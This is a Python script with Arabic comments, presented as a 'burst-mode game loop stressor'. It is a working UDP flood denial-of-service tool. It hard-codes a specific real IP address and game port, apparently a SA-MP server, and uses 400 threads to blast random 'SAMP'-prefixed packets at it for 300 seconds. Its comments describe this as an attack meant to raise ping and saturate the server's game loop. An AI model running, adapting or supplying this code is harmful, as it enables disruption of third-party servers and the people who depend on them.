import socket
import random
import threading
import time

# =====================================================================
# === TRAPKING BURST-MODE GAME LOOP STRESSOR (High-Frequency) ===
# =====================================================================

TARGET_IP = "94.23.168.153"  # IP الهدف
TARGET_PORT = 2343            # بورت اللعبة
DURATION = 300                 # مدة الهجوم بالثواني
THREADS_COUNT = 400           # رفع عدد الخيوط لزيادة التردد

def burst_attack_worker():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # تعيين السوكت ليكون غير حظري لتسريع عمليات الإرسال لأقصى حد ممكن
    client.setblocking(False)
    
    end_time = time.time() + DURATION
    
    # تحضير مجموعة من الحزم المتنوعة مسبقاً لتوفير وقت المعالجة أثناء الإرسال
    payloads = [
        b'SAMP' + bytes([random.randint(0, 255) for _ in range(4)]) + random._urandom(512),
        b'SAMP' + bytes([random.randint(0, 255) for _ in range(4)]) + random._urandom(1024),
        b'SAMP' + random._urandom(768)
    ]
    
    while time.time() < end_time:
        try:
            # إرسال دفعة سريعة (Burst) من الحزم المتنوعة بدون توقف
            for _ in range(10):
                payload = random.choice(payloads)
                client.sendto(payload, (TARGET_IP, TARGET_PORT))
        except:
            pass
            
    client.close()

def main():
    print(f"[*] بدء وضع الدفعات السريعة (Burst Mode) على: {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] تفعيل {THREADS_COUNT} خيط لرفع الـ Ping وإحداث تشبع في الـ Game Loop...")
    
    threads = []
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=burst_attack_worker)
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("\n[+] انتهت جلسة الدفعات المكثفة.")

if __name__ == "__main__":
    main()
